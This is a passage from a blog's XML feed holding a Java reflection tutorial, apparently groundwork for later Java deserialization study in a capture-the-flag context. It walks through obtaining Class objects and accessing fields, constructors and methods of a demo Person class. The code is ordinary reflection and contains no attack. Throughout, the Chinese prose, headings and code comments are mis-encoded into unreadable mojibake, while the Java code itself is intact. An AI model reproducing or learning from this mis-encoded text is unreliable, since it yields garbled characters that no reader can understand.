src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203261210881.png" alt="QQæˆªå›¾20220215144737"></p><p>å¸®å©†å©†æ‹–åœ°å»äº†ï¼Œæ˜å¤©å°±è¦èµ°äº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆç†è§£åå°„</title>
    <link href="/2022/02/25/%E5%88%9D%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/"/>
    <url>/2022/02/25/%E5%88%9D%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h1 id="åˆç†è§£åå°„"><a href="#åˆç†è§£åå°„" class="headerlink" title="åˆç†è§£åå°„"></a>åˆç†è§£åå°„</h1><h2 id="ç†è§£åå°„"><a href="#ç†è§£åå°„" class="headerlink" title="ç†è§£åå°„"></a>ç†è§£åå°„</h2><p>Javaä¸­çš„åå°„æœºåˆ¶æ˜¯æŒ‡<strong>åœ¨è¿è¡ŒçŠ¶æ€ä¸­</strong>ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»éƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼›å¹¶ä¸”å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•ï¼›è¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½æˆä¸ºJavaè¯­è¨€çš„åå°„æœºåˆ¶ã€‚</p><p>è¿™é‡Œçš„å¯ä»¥åœ¨è¿è¡ŒçŠ¶æ€ä¸­è·å–ä¿®æ”¹å€¼å¾ˆæ£’ã€‚ä»¥åçš„ccé“¾å°±è¦ç”¨åˆ°ã€‚</p><h2 id="è·å–Classå¯¹è±¡"><a href="#è·å–Classå¯¹è±¡" class="headerlink" title="è·å–Classå¯¹è±¡"></a>è·å–Classå¯¹è±¡</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Class.forName(&quot;å…¨ç±»å&quot;) è¯¥è¿‡ç¨‹å¤„äºå­—èŠ‚ç é˜¶æ®µ</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">cls1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;xsw6a.Person&quot;</span>);<br>System.out.println(cls1);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ç±»å.classå±æ€§ è¯¥è¿‡ç¨‹å¤„äºå†…å­˜é˜¶æ®µ</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">cls2</span> <span class="hljs-operator">=</span> Person.class;<br>System.out.println(cls2);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å¯¹è±¡.getClass()æ–¹æ³• è¯¥è¿‡ç¨‹å¤„äºè¿è¡Œé˜¶æ®µ</span><br><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">cls3</span> <span class="hljs-operator">=</span> p.getClass();<br>System.out.println(cls3);<br></code></pre></td></tr></table></figure><h2 id="ç±»å¯¹è±¡ä¸­æœ‰ä»€ä¹ˆï¼Ÿ"><a href="#ç±»å¯¹è±¡ä¸­æœ‰ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ç±»å¯¹è±¡ä¸­æœ‰ä»€ä¹ˆï¼Ÿ"></a>ç±»å¯¹è±¡ä¸­æœ‰ä»€ä¹ˆï¼Ÿ</h2><ul><li>æˆå‘˜å˜é‡ï¼ˆFieldå¯¹è±¡ï¼ŒField[] fieldsï¼‰</li><li>æ„é€ æ–¹æ³•   (Constructorå¯¹è±¡ï¼ŒConstructor[] cons)</li><li>æˆå‘˜æ–¹æ³•  (Methodå¯¹è±¡ï¼ŒMethod[] methods)</li></ul><h2 id="ä¸‰ç§é˜¶æ®µ"><a href="#ä¸‰ç§é˜¶æ®µ" class="headerlink" title="ä¸‰ç§é˜¶æ®µ"></a>ä¸‰ç§é˜¶æ®µ</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252218849.png" alt="image-20200411205831842"></p><h3 id="sourceæºä»£ç é˜¶æ®µ"><a href="#sourceæºä»£ç é˜¶æ®µ" class="headerlink" title="sourceæºä»£ç é˜¶æ®µ"></a>sourceæºä»£ç é˜¶æ®µ</h3><p>æ­¤æ—¶åˆšåˆšç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼Œä»ç„¶ä¿å­˜åœ¨ç¡¬ç›˜ä¸Šã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">cls1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;xsw6a.Person&quot;</span>);<br>System.out.println(cls1);<br></code></pre></td></tr></table></figure><h3 id="Classç±»å¯¹è±¡é˜¶æ®µ"><a href="#Classç±»å¯¹è±¡é˜¶æ®µ" class="headerlink" title="Classç±»å¯¹è±¡é˜¶æ®µ"></a>Classç±»å¯¹è±¡é˜¶æ®µ</h3><p>ç±»åŠ è½½å™¨æŠŠPerson.classå­—èŠ‚ç åŠ è½½è¿›å†…å­˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">cls2</span> <span class="hljs-operator">=</span> Person.class;<br>System.out.println(cls2);<br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œæ—¶é˜¶æ®µ"><a href="#è¿è¡Œæ—¶é˜¶æ®µ" class="headerlink" title="è¿è¡Œæ—¶é˜¶æ®µ"></a>è¿è¡Œæ—¶é˜¶æ®µ</h3><p>è¿™ä¸ªæ—¶å€™ç±»å¯¹è±¡å·²ç»å®ä¾‹åŒ–æˆä¸ºäº†ä¸€ä¸ªå¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">cls3</span> <span class="hljs-operator">=</span> p.getClass();<br>System.out.println(cls3);<br></code></pre></td></tr></table></figure><h4 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h4><ul><li>ä½¿ç”¨Class.forName()ä¼šè‡ªåŠ¨åˆå§‹åŒ–è¯¥Classå¯¹è±¡ï¼ŒClass.forName() æ–¹æ³• å½“ç±»åŠ è½½è¿›äº†å†…å­˜ï¼Œåªæœ‰<strong>é™æ€åˆå§‹å—</strong>å¾—åˆ°äº†æ‰§è¡Œã€‚getDeclaredxxx ä¸èƒ½è·å–çˆ¶ç±»çš„æ–¹æ³•ã€‚</li><li>ä½¿ç”¨ç±»å.classæ¥åˆ›å»ºClasså¯¹è±¡çš„å¼•ç”¨æ—¶ï¼Œä¸ä¼šè‡ªåŠ¨åˆå§‹åŒ–è¯¥Classå¯¹è±¡</li><li>Class.forName() å±äºåŠ¨æ€åŠ è½½ç±»ã€‚å°†å­—èŠ‚ç æ–‡ä»¶åŠ è½½è¿›å†…å­˜ï¼Œå‚æ•°éœ€è¦ç±»çš„å…¨é™å®šå</li></ul><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="Personç±»"><a href="#Personç±»" class="headerlink" title="Personç±»"></a>Personç±»</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;åƒé¥­&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰“ç¯®çƒ&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="åå°„è·å–"><a href="#åå°„è·å–" class="headerlink" title="åå°„è·å–"></a>åå°„è·å–</h3><h4 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h4><ul><li>Fields[] getFields()ï¼šåªèƒ½è·å–æ‰€æœ‰publicä¿®é¥°çš„æˆå‘˜å˜é‡</li><li>Fields getField(String name)ï¼šè·å–ç‰¹å®šæˆå‘˜å˜é‡</li><li>Fields[] getDeclaredFields()ï¼šè·å–æ‰€æœ‰çš„æˆå‘˜å˜é‡ï¼Œã€ä¸è€ƒè™‘ã€‘ä¿®é¥°ç¬¦ï¼Œä¸è€ƒè™‘ç»§æ‰¿</li><li>Fields getDeclaredField(String name)ï¼šè·å–ç‰¹å®šçš„æˆå‘˜å˜é‡ï¼Œã€ä¸è€ƒè™‘ã€‘ä¿®é¥°ç¬¦ï¼Œä¸è€ƒè™‘ç»§æ‰¿</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoFields</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        Field[] fields = personClass.getFields();<br>        <span class="hljs-keyword">for</span>(Field field : fields)&#123;<br>            System.out.println(field);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåªä¼šè·å–publicå±æ€§çš„æˆå‘˜å˜é‡ã€‚ï¼ˆä¸ä¼šæœ‰ä»»ä½•å›æ˜¾ï¼Œè¯¥æ–¹æ³•ä¸ä¼šç›´æ¥è·å–æ‰€æœ‰æˆå‘˜å˜é‡ï¼‰ã€‚</p><p>æƒ³è¦è·å–æ‰€æœ‰æˆå‘˜å˜é‡å¦‚ä¸‹(æœ‰å›æ˜¾)ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemogetDeclaredFields</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        Field[] declaredFields = personClass.getDeclaredFields();<br>        <span class="hljs-keyword">for</span>(Field declaredField : declaredFields)&#123;<br>            System.out.println(declaredField);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252130870.png" alt="QQæˆªå›¾20220225212503"></p><p>ç»™Personç±»èµ‹å€¼ï¼ˆè¿™é‡Œé‡‡ç”¨çš„æ˜¯<code>getField</code>,åªèƒ½é‡‡ç”¨é‡æ–°è®¾ç½®publicå±æ€§èµ‹å€¼ï¼‰<br>ä¿®æ”¹<code>person</code>ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> String a;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getA</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setA</span><span class="hljs-params">(String a)</span> &#123;<br>        <span class="hljs-built_in">this</span>.a = a;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, a=&#x27;&quot;</span> + a + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;åƒé¥­&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰“ç¯®çƒ&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemogetDeclaredFieldsTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> personClass.getField(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> a.get(person);<br>        System.out.println(o);<br>        a.set(person,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        System.out.println(person);<br><br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥è·å–<code>private</code>å±æ€§çš„å€¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemogetDeclaredFieldsTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> personClass.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> name.get(person);<br>        System.out.println(o);<br>        name.set(person,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        System.out.println(person);<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±ä¸ä¸€ä¸€æ¼”ç¤ºäº†ã€‚</p><h4 id="æ„é€ å™¨"><a href="#æ„é€ å™¨" class="headerlink" title="æ„é€ å™¨"></a>æ„é€ å™¨</h4><ul><li>Constructor[] getConstructors()</li><li>Constructor getConstructor(ç±» &lt;?&gt; â€¦ parameterTypes)</li><li>Constructor getDeclaredConstructors()</li><li>Constructor getDeclaredConstructor(ç±» &lt;?&gt; â€¦ parameterTypes)</li></ul><p><strong>è®°å¾—ç»™Personæ·»åŠ æ„é€ æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoConstruct</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> personClass.getConstructor(String.class,<span class="hljs-type">int</span>.class,String.class);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-string">&quot;xsw6a&quot;</span>,<span class="hljs-number">11</span>,<span class="hljs-string">&quot;harworking&quot;</span>);<br>        System.out.println(o);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> personClass.getConstructor(String.class,<span class="hljs-type">int</span>.class,String.class);<span class="hljs-comment">//æ¯ä¸€ä¸ªæ„é€ æ–¹æ³•çš„å‚æ•°ç§ç±»ä¸ä¸€æ ·ï¼Œè¿™ä¸€æ­¥æ˜¯è·å–æ„é€ æ–¹æ³•</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252200686.png" alt="QQæˆªå›¾20220225220052"></p><p>å¦‚æœæ˜¯æ— å‚æ„é€ æ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨Classç±»å¯¹è±¡çš„newInstanceæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> personClass.newInstance();<br>System.out.println(o);<br></code></pre></td></tr></table></figure><h4 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h4><ul><li><p>Method[] getMethods()&#x2F;&#x2F;è·å–æ‰€æœ‰ã€publicã€‘ä¿®é¥°çš„æ–¹æ³•ï¼Œçˆ¶ç±»Objectçš„æ–¹æ³•ä¹Ÿèƒ½çœ‹åˆ°</p></li><li><p>Method getMethod(String nameï¼Œç±» &lt;?&gt; â€¦ parameterTypes)</p></li><li><p>Method[] getDeclaredMethods()&#x2F;&#x2F;è·å–æ‰€æœ‰å£°æ˜æ–¹æ³• ä¸è€ƒè™‘ä¿®é¥°ç¬¦ ä¸è€ƒè™‘ç»§æ‰¿çš„æ–¹æ³•</p></li><li><p>Method getDeclaredMethod(String nameï¼Œç±» &lt;?&gt; â€¦ parameterTypes) ä¸è€ƒè™‘ä¿®é¥°ç¬¦ ä¸è€ƒè™‘ç»§æ‰¿çš„æ–¹æ³•</p><p><strong>æ— å‚æ•°ç±»å‹ã€‚</strong></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoMethod</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">eat</span> <span class="hljs-operator">=</span> personClass.getMethod(<span class="hljs-string">&quot;eat&quot;</span>);<span class="hljs-comment">//è·å–åˆ¶å®šåç§°çš„æ–¹æ³•</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> 